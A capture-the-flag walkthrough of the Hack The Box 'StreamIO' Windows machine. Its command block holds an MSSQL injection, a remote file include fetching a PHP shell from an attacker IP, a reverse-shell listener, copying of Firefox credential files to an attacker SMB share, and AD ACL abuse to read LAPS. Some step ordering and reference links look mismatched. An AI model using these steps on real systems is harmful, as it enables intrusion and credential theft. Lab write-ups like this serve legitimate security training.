## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- **Exploits Used:**  
  - SQL Injection (stacked queries) on `/search.php` 🐍  
  - Remote File Include via `debug` parameter for RCE 📝  
  - MSSQL xp_dirtree for Net‑NTLMv2 capture (dead end) 🔒  
  - PHP credential harvesting (db_user / db_admin) 🗄️  
  - Hash‑cracking (MD5) with RockYou 🔑  
  - WebShell → Reverse shell with `nc64.exe` 🖥️  
  - Local enumeration → Firefox profile dump & Firepwd 🔍  
  - BloodHound + ADACL abuse → LAPS retrieval 🔐  
- **Open Ports (relevant):**  
  - [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) 80/tcp  
  - [HTTPS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview) 443/tcp  
  - SMB 445/tcp  
  - WinRM 5985/tcp  

---

## TLDR 🚀
1. **SQLi** on `watch.streamio.htb/search.php` finds injection via stacked queries.  
2. **RFI** on `streamio.htb/admin/?debug=` includes remote PHP, yielding a reverse shell as **yoshihide**.  
3. **Dump** main DB tables → **MD5** hashes → crack for **yoshihide**, **nikk37**, etc.  
4. **Login** to `streamio.htb/login.php` with cracked creds → **nikk37** shell via Evil‑WinRM.  
5. **Extract** Firefox `logins.json` + `key4.db` → Firepwd → **JDgodd** Slack creds.  
6. **BloodHound** (as JDgodd) → abuse Core Staff ACL → read **LAPS** from DC → Administrator shell.  

---

## Tools 🛠️
- **nmap** – port & service enumeration  
- **wfuzz**, **feroxbuster** – vhost & directory discovery  
- **Burp Suite** – manual SQLi & RFI testing  
- **sqlmap** – confirm SQLi injection point  
- **curl** – test HTTP methods & include payloads  
- **nc64.exe** – Windows reverse shell payload  
- **Responder** – Net‑NTLMv2 capture (enumeration step)  
- **hashcat** – MD5 hash cracking (`-m 0`)  
- **evil-winrm** – remote PowerShell shell  
- **sqlcmd** – on‑box MSSQL querying  
- **PowerView.ps1** – AD ACL & group manipulation  
- **firepwd.py** – Firefox password decryption  
- **bloodhound-python** + BloodHound GUI – AD enumeration and ACL discovery  

---

## Commands to Solve Box 📝

```bash
# 1. Confirm SQLi on search.php
curl -k -d "q=test' WAITFOR DELAY '0:0:5'--" https://watch.streamio.htb/search.php

# 2. RFI to include remote PHP (master.php)
curl -k -X POST "http://streamio.htb/admin/?debug=master.php" \
     -d "include=http://10.10.14.6/shell.php"

# 3. Reverse shell listener
nc -lvnp 443

# 4. Crack main DB hashes
hashcat -m 0 user-passwords rockyou.txt --user

# 5. Evil‑WinRM as nikk37
evil-winrm -i 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'

# 6. Exfil Firefox creds
# On host: smbserver.py share . -user oxdf -pass oxdf -smb2support
# On box:
net use \\10.10.14.6\share /u:oxdf oxdf
copy %APPDATA%\mozilla\Firefox\Profiles\*.default-release\{key4.db,logins.json} \\10.10.14.6\share\

# 7. Decrypt with Firepwd
firepwd.py key4.db logins.json

# 8. BloodHound collect as JDgodd
bloodhound-python -c All -u JDgodd -p 'password@12' -d streamio.htb -ns 10.10.11.158 --zip

# 9. Abuse Core Staff ACL & read LAPS
# On box via Evil-WinRM (JDgodd):
Import-Module .\PowerView.ps1
$pass=ConvertTo-SecureString 'password@12' -AsPlainText -Force
$cred=New-Object PSCredential 'streamio.htb\JDgodd',$pass
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "streamio\JDgodd"
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred

# 10. Administrator shell via LAPS
evil-winrm -i 10.10.11.158 -u Administrator -p '-Z4I/T1W0%+4nF'
```

---

## Actions Learned 💡
- Craft **stacked‑query** SQL injection in MSSQL 🐍  
- Achieve **RCE** via PHP file‑include debugging endpoint 🚨  
- Use **sqlcmd** on Windows to query internal DBs 🗄️  
- Extract & **crack** MD5 hashes en masse with hashcat 🔑  
- Dump **Firefox** saved credentials (key4.db + logins.json) → Firepwd 🔐  
- Leverage **BloodHound** & **PowerView** to abuse AD ACLs 🧩  
- Read **LAPS** password from computer object for SYSTEM 🤖  

---

## References 📚
- Stack‑based SQLi in MSSQL:  
  – https://portswigger.net/web-security/sql-injection/mysql/stacked-queries  
- PHP RFI via `php://filter`:  
  – https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion  
- Firepwd (Firefox decrypt):  
  – https://github.com/AndreMiras/pyfirepwd  
- PowerView & AD ACL abuse:  
  – https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon  
- LAPS enumeration & crackmapexec:  
  – https://github.com/byt3bl33d3r/CrackMapExec/wiki/LAPS-module  